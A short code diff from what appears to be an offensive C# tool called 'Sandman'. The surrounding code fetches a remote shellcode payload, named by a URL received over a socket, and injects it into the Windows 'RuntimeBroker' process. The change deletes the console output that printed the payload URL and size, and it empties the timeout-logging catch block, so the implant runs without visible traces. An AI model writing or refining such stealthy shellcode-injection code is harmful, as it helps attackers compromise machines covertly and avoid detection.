@@ -101,15 +101,12 @@ namespace Sandman
                         return;
 
                     // Injecting and executing the shellcode.
-                    Console.WriteLine($"payloadUrl: {payloadUrl} payloadSize: {payloadSize}");
                     if (Injector.InjectShellcode(payloadUrl, payloadSize, "RuntimeBroker"))
                         keepRunning = false;
                 }
             }
             catch (SocketException)
-            {
-                Console.WriteLine($"Timeout occured.");
-            }
+            { }
             finally
             {
                 if (socket.Connected)
